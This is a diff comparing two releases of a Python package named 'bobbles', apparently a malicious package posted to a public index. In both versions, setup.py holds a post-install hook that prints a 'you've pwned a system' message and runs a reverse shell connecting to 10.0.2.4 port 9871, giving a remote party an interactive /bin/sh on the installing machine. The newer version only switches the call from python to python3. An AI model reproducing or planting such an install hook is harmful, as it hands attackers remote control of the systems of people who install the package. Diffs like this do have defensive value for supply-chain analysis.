# Comparing `tmp/bobbles-190.0.1.tar.gz` & `tmp/bobbles-190.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "bobbles-190.0.1.tar", last modified: Tue Jun 27 07:35:20 2023, max compression
+gzip compressed data, was "bobbles-190.0.2.tar", last modified: Tue Jun 27 08:33:49 2023, max compression
```

## Comparing `bobbles-190.0.1.tar` & `bobbles-190.0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxr-x   0 root         (0) root         (0)        0 2023-06-27 07:35:20.483365 bobbles-190.0.1/
--rw-r--r--   0 root         (0) root         (0)      207 2023-06-27 07:35:20.483365 bobbles-190.0.1/PKG-INFO
-drwxrwxr-x   0 root         (0) root         (0)        0 2023-06-27 07:35:20.475366 bobbles-190.0.1/bobbles/
--rwxrwxrwx   0 root         (0) root         (0)      105 2023-06-21 08:47:53.000000 bobbles-190.0.1/bobbles/main.py
-drwxrwxr-x   0 root         (0) root         (0)        0 2023-06-27 07:35:20.483365 bobbles-190.0.1/bobbles.egg-info/
--rw-r--r--   0 root         (0) root         (0)      207 2023-06-27 07:35:20.000000 bobbles-190.0.1/bobbles.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      148 2023-06-27 07:35:20.000000 bobbles-190.0.1/bobbles.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-27 07:35:20.000000 bobbles-190.0.1/bobbles.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)        8 2023-06-27 07:35:20.000000 bobbles-190.0.1/bobbles.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-27 07:35:20.487365 bobbles-190.0.1/setup.cfg
--rwxrwxrwx   0 root         (0) root         (0)      876 2023-06-27 07:35:17.000000 bobbles-190.0.1/setup.py
+drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 08:33:49.445722 bobbles-190.0.2/
+-rwxrwx---   0 root         (0) vboxsf     (998)      207 2023-06-27 08:33:49.445722 bobbles-190.0.2/PKG-INFO
+drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 08:33:49.433722 bobbles-190.0.2/bobbles/
+-rwxrwx---   0 root         (0) vboxsf     (998)      107 2023-06-27 08:29:33.000000 bobbles-190.0.2/bobbles/main.py
+drwxrwx---   0 root         (0) vboxsf     (998)        0 2023-06-27 08:33:49.441722 bobbles-190.0.2/bobbles.egg-info/
+-rwxrwx---   0 root         (0) vboxsf     (998)      207 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/PKG-INFO
+-rwxrwx---   0 root         (0) vboxsf     (998)      148 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/SOURCES.txt
+-rwxrwx---   0 root         (0) vboxsf     (998)        1 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/dependency_links.txt
+-rwxrwx---   0 root         (0) vboxsf     (998)        8 2023-06-27 08:33:49.000000 bobbles-190.0.2/bobbles.egg-info/top_level.txt
+-rwxrwx---   0 root         (0) vboxsf     (998)       38 2023-06-27 08:33:49.445722 bobbles-190.0.2/setup.cfg
+-rwxrwx---   0 root         (0) vboxsf     (998)      877 2023-06-27 08:33:42.000000 bobbles-190.0.2/setup.py
```

### Comparing `bobbles-190.0.1/setup.py` & `bobbles-190.0.2/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,20 +1,20 @@
 from setuptools import find_packages
 from setuptools import setup
 from setuptools.command.install import install
 import os
 import sys
 
-VERSION = 'v190.0.1'
+VERSION = 'v190.0.2'
 
 class PostInstallCommand(install):
      def run(self):
          install.run(self)
          print ("Hello Nade you've pwned a system")
-         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",9871));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
+         os.system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",9871));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
 
 setup(
         name='bobbles',
         author='nadedjk',
         author_email='nade@djk.com',
         version=VERSION,
         packages=['bobbles'],
```

